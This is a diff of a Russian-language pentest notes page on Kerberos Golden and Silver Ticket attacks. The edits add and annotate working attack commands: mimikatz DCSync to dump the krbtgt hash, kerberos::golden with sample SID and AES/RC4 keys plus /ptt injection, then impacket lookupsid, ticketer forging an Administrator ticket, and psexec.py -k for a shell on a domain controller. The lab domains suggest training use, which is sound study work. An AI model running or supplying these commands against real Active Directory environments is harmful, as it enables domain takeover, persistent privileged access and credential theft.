@@ -26,7 +26,7 @@
 
 Самый сложный 4 пункт, однако его можно получить, напрмер, через атаку [[DCSync]]
 
-## Атака
+## Атака через Windows
 
 0.0) Проведение DCSync
 
@@ -35,20 +35,24 @@
 lsadump::dcsync /user:<blabla>\krbtgt
 ```
 
-1.1) Выпуск [[Golden Ticket]]
+1.1) Выпуск Golden Ticket
 ```powershell
 kerberos::golden 
-/user:idyachkov 
-/domain:testlab.esc 
-/sid:S-1-5-21-1129291328-2819992169-918366777  /aes256:1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc
+/user:idyachkov # обязательно
+/domain:testlab.esc # обязательно
+/sid:S-1-5-21-1129291328-2819992169-918366777  # обязательно
+/aes256:1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc # или RC4
+/rc4:810d754e118439bab1e1d13216150299 # или AES
+/ptt # Сразу инжектируем в сессию
+
 /id:1110 # Не обязательно
-/groups:513 
-/ticket:idyachkov.testlab.esc
-/endin:600 # общее время жизни (мин)
-/renewmax:10080 # срок, когда билет нужно продлевать (мин)
+/groups:513 # Не обязательно
+/ticket:idyachkov.testlab.esc # Не обязательно
+/endin:600 # общее время жизни (мин)  Не обязательно
+/renewmax:10080 # срок, когда билет нужно продлевать (мин) Не обязательно
 ```
 
-1.2) Выпуск [[Silver Ticket]]
+1.2) Выпуск Silver Ticket
 ```powershell
 kerberos::golden 
 /user:idyachkov 
@@ -79,15 +83,33 @@ kerberos::golden
 ```mimikatz
 kerberos::ptt <ticket>
 ```
+или WinRM
+```powereshell
+Enter-PSSession dc01
+```
 
 
-## Через Impacket-ticketer
+## Атака через Linux
+
+1) Определение SID домена
+```bash
+lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
+```
+
+
+2) Выпуск Golden Ticket
 ```bash
 sudo impacket-ticketer \
 -nthash <krbtgt_hash>  \
 -domain <domain> \ 
 -domain-sid <sid>  \
-FakeAdmin
+Administrator
+```
+
+3) Инжектирование билета и получение доступа к хосту
+```bash
+export KRB5CCNAME=./Administrator.ccache
+psexec.py -k -no-pass dc01.inlanefreight.local
 ```
 
 ## Detect attack
